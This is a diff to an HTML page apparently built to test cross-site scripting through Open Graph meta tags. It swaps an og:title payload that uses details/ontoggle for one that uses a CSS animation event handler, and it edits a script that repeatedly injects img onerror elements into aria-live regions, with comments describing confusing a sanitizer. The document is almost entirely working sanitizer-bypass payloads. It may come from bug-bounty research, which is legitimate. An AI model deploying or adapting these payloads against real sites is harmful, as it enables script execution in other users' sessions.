@@ -5,16 +5,16 @@
     <meta property="fb:app_id" content="966242223397117">
     <meta property="og:url" content="https://xsstestfb.vercel.app/">
     <meta property="og:type" content="website">
-    <meta property="og:description" content="Security Research Verification Content">
+    <meta property="og:description" content="Verified security researcher content.">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png">
 
-    <meta property="og:title" content="Verified &#x22;><details/open/ontoggle=&#x22;fetch(&apos;https://graph.facebook.com/?id=1&callback=alert(document.domain)&apos;)&#x22;>">
+    <meta property="og:title" content="Verified &#x22;><style>@keyframes x{}</style><img style='animation-name:x' onanimationstart='alert(document.domain)'>">
 
-    <title>Research Lab</title>
+    <title>Bypass Test</title>
 </head>
 <body>
     <script>
-        // তোমার সেই সফল হওয়া কন্সোল লজিক যা স্যানিটাইজারকে কনফিউজ করবে
+        // তোমার সেই সফল হওয়া ARIA Sink লজিক
         setInterval(() => {
             const sinks = document.querySelectorAll('[aria-live="assertive"]');
             sinks.forEach(s => {
@@ -22,7 +22,7 @@
                     s.dataset.x = "1";
                     const i = document.createElement('img');
                     i.src = 'x';
-                    i.onerror = () => { alert('XSS_Bypass_Confirmed'); };
+                    i.onerror = () => { alert('XSS_Confirmed'); };
                     s.appendChild(i);
                 }
             });
